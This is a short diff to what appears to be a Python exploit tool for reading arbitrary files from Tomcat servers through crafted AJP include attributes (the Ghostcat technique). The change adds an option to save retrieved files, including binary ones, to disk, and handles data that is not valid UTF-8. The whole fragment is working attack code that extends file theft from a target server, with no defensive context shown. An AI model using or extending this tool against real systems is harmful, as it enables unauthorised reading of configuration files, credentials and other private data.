@@ -23,6 +23,7 @@ import logging
 import re
 import os
 import logging
+import sys
 try:
 	from urllib import unquote
 except ImportError:
@@ -341,6 +342,7 @@ if __name__ == "__main__":
 	read_file.set_defaults(which='read_file')
 	read_file.add_argument("file_path", type=str, help="File to read")
 	read_file.add_argument("-w", "--webapp", type=str, default="", help="Webapp")
+	read_file.add_argument("-o", "--output", type=str, help="Output file (for binary files)")
 
 	args = parser.parse_args()
 
@@ -373,5 +375,18 @@ if __name__ == "__main__":
 			{"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "",)},
 		]
 		hdrs, data = bf.perform_request("/" + args.webapp + "/xxxxx.jsp", attributes=attributes)
+		output = sys.stdout
+		if args.output:
+			output = open(args.output, "wb")
 		for d in data:
-			print(d.data.decode('utf8'))
+			if args.output:
+				output.write(d.data)
+			else:
+				try:
+				    output.write(d.data.decode('utf8'))
+				except UnicodeDecodeError:
+				    output.write(repr(d.data))
+
+		if args.output:
+			output.close()
+
